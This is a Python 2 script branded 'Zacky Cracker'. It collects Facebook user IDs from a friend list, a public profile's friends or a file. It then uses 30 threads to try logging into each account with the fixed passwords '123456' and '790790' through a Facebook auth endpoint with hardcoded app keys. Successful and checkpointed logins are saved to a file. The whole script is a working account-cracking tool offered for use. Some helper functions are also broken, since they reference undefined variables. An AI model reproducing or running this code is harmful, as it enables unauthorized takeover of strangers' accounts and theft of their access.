#!/usr/bin/python
# coding=utf-8
#Import module
try:    
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 123456_790790.py')

#Browser Setting
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Mozilla/5.0 (Linux; Android 6.0.1; SO-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36')]

def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def zaki(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def hopss(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)

##### LOGO #####
banner = """
╔═╗╔═╗╔═╗╦╔═╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗
╔═╝╠═╣║  ╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝
╚═╝╩ ╩╚═╝╩ ╩ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═ \033[1;94m v 1.0
\033[1;34m╔═════════════════════\033[1;96m══════════════════════╗
\033[1;34m║  \033[1;93mAuthor   \033[1;91m: \033[1;92mZacky Tr\033[1;95micker                 \033[1;96m║
\033[1;34m║  \033[1;93mGithub   \033[1;91m: \033[1;92mhttps://\033[1;95mgithub.com/ZAKI-ZK    \033[1;96m║
\033[1;34m║  \033[1;93mFb       \033[1;91m: \033[1;92mfacebook\033[1;95m.com/kang.mazid.9     \033[1;96m║
\033[1;34m╚═════════════════════\033[1;96m══════════════════════╝"""

back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []
			
#Menu
def menu():
    os.system('clear')
    print banner
    print
    print "\033[1;93m[1] Crack From Friendlist"
    print "[2] Crack From Public ID"
    print "[3] Crack From File"
    print "[0] Back"
    print
    crack_menu()
    

def crack_menu():
	crm = raw_input("Choose Option >>  ")
	if crm =="":
		print "[!] Filled Incorrectly"
		crack_menu()
	elif crm =="1":
		os.system('clear')
		print banner
		print
		token=open('login.txt','r').read()
		time.sleep(1)
		os.system('clear')
		print banner
		print
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif crm =="2":
		os.system('clear')
		print banner
		print
		token=open('login.txt','r').read()
		time.sleep(1)
		os.system('clear')
		print banner
		print
		idt = raw_input("[+] Input ID: ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
			zaki('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
		except KeyError:
			print"[!] ID Not Found!"
			raw_input("\nPress Enter To Back  ")
			menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif crm =="3":
	    os.system('clear')
	    print banner
	    try:
	        idlist= raw_input('[+] File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] File Not Found."
	         raw_input('Press Enter To Back. ')
	         menu()
	   
	        
	        
	elif crm =="0":
		os.system('python2 zack.py')
	else:
		print "Filled Incorrectly"
		crack_menu()
	
        zaki('[✓] Total Friends: '+str(len(id)))
        time.sleep(0.5)
	zaki('[✓] The Process Has Been Started.')
	time.sleep(0.5)
        zaki('[!] To Stop Process Press CTRL Then Z')
        time.sleep(0.5)
        print
        print (47*"-")
     
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+token)
			b = json.loads(a.text)
			pass1 = '123456'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					pass2 = '790790'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)      					
								                                       
				                                                                           
	
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	zaki('[✓] Process Has Been Completed.')
	zaki('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	os.system("python2 zack.py")
	
	

if __name__ == '__main__':
	menu()




